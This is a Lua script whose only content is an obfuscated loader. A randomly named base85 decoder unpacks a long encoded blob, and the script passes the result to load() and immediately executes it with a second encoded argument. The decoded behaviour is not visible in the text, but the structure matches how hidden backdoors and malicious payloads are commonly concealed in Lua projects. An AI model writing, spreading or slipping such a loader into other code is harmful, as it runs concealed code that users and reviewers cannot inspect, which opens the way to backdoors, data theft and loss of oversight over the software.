
local function byqKGGXHMk(s)
    local m = {}
    local c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)] = i-1 end
    local o, v, n, p = {}, 0, 0, {52200625, 614125, 7225, 85, 1}
    for i=1, #s do
        local x = m[string.byte(s,i)]
        if x then
            v = v + x * p[n+1]
            n = n + 1
            if n == 5 then
                table.insert(o, string.char(math.floor(v/16777216), math.floor((v%16777216)/65536), math.floor((v%65536)/256), v%256))
                v, n = 0, 0
            end
        end
    end
    return table.concat(o)
end
local vm_func = load(byqKGGXHMk("3T$s<VQe65acECaP*-A6K_ERKb98cPZf7oIXkl_FF*YkSFf1`NH!U(XEHN=TEi^DJF*PeRFf2GVD>E`IF*G+VGB+$UFe@@QEHN`NEi*JMF)}bMGcznPG&e0YGb}MNHZ3$TEHyVPG%_qXH7hbUEHO4KGcqhOHZv_WGAuDNFfB4OEHybRF*qzVHY+nTEH*VOGdL_cG%YeREHN=PEipJOF*7nPG&C$WG%GVVEHpJMGcYVMGdC?VGb}VTD>E}JF)=eOGBqqQGdL|XF)T4OH7znZEHgAKF*PhPGBqtUGb}hbD=|4K3T$s<VQe5~b#7yHX>V>IaCB5kX>D_7Oid_ZEMh4jY;R*>Y#?wfV?8k}FgqZ3XlZO^AYnc*AYpD~AYwi+AY^YKY;R*>Y#?%BEOKH!VI?vwVkI&=AZcbGa$$Zwa$+EKXk~67V?ARla3E!FWIG^XEMhEhJt$!<a$zYiGAt-!EplQhFET7}Dl$7DWo~3UAZcbGVLW0WbZBL6AYnaXAZ2c3J0N#xX>4U6VLmV*WN#pBZ)0I>AaY?nVI?v<AZcbGa$!C&AarPDZXjblV=HhVWo~3UAYm+UJt$!<a$zYiGAwW^GCLq;Ze%+ka%FUNa&91FJ0N9lWIGCMZ)0I>AZB%LV{~b6ZXi~2P-tRmXJlwaC}b=kYbgpKARr)YZ)0I>Aafu+AbWivW^ZyJX+1D3GBq_IWN#pITWMWAX&_~8WC|c4ARugSV_|F{Y9KuzFbW_bARuOMav*6vFf1}PH6Ubf3LqdLARr(hAZj2zASh}eD<E@QX<Z;IAaitbX>MmOVtI6BC~GVrC}|)iAR}ujAS)m-DJdW&ATl*J3LqdLARr(hAah%3T`VATTWVb(Js@*iYF#WKb6aU$3LqdLAZ2c33LqdLAZ%}AVQe62EFf=nbSxlhAUz;3EFgP*EFdrnARr(hW^ZyJX=HdkF)Sb>WFTa33LqdLARr(hAZZ{yASh`dD<Cl`ASEC&H8u($ARr(hARr)WAUz-`Y9K2hb6aU$DIg^vGBq{|ARr(hARr(hb6aU$EFg1RYF!{bAah%4T`VATTWMViARr(hARr(hZ*_EABX4zdD=}RlJs@**a%pa7E@Nn6awu?gR7z=Wb7xFVD06gjX>MmOVtI6BC}b=kX=HdQEFg1RD05qBT_7tUb6aX%DIg^vGBq|`DJcpdARr)RZe$7|ARr)eWps6NZXk4FVr*qDV{dL_VRR^Ob#y5TWo~2&a%FUNa&91Ib#7yHX>V>Qa9?6LH7N=pARr)YZ)0I>AZ=lAAUz;^eF`8TARugSV_|F{V`yP=b09q+A}}#BGc+|eH#j*#LPJDFMn_0VN=r;lPESx#Qd3k_R##YAT47>iWMyV&XlZI|Y;A6DaB*^Tbai%jczJpuBP1mzC@Cr{Ejv6tK0iQSUtoKDeSRVeARr(hW^ZyJX+1G4I5i+-Zy;@9a9eY9a%pa7E@F9fWhi54VRCaUX(?SGJs@c<F(74bWC|c4ARugSV_|F{Z*_DmAa-GFEFf+yAaEc(AbWi*ATTT-Ff1T@H8L_VFg7wZEFd;9G%+$YEFd>BGBqq9I5jLFF?|XkARr)SZ*m}MJuxgGBXD10I5i+-ZweqFARr(hARugSV_|F{b|5_<ZDDX*b98cPZf7oHd30qca9?6LH7p=$DP0O6ARr(hARr)VW*~MTbZBL63LqdLARr(hARr(hAa-GFAUz;<VQe5PAa)=sAaGl5D=}RPARr(hARr(hARr(hZXi7%ZXhclF$y3cARr(hARr(hARuXGAZ{Q%Js>q8bZBL63LqdLARr(hARr(hARr(hAar43Y-KKKZgXXFbSQ6ibSxlqbaH8KXD(xCVR9&KVRUFNW^8Y7awv9TY%ei3H#avjF*YeIAZ=lEXf9@KZ*OuaD0X3NB{4QPH#agdHYqPQH8nFfDJ&puVRUFNW^8Y7awsTvVQeKfH8nFfDK9cLHYqG1c42HKGBq|SDGDGUARr(hARr(hARr(hARu;OY%CydAUz;3EFdrnARr(hARr(hARr(hWo~2&ARr(hARr(hWo~2&ARr(hWo~2&ARr(hY;R*>Y#?%Fb09q+R&r2iVrpk(XhkS=VPb4$E@N+QV_|eCZ*_DjEFf%gXird3S7K2?DGDGUARugSV_|F{W*|KvY;R#?C~{?UDGDGUARuXGAZ8$RXk~67W+*8jWo~2&Wo~2&"))
if vm_func then vm_func()("NLF;P7n>ai?KEnnF!`WxeGvAhx2Vv6PUv8v28Qi|@YxZTL<)q-?bO4@2LbW4mJ*p`quM1xFnumzlg|o>7v~5|A5-}<mE<xm>D+oJtr2>vlq5hgY5") end
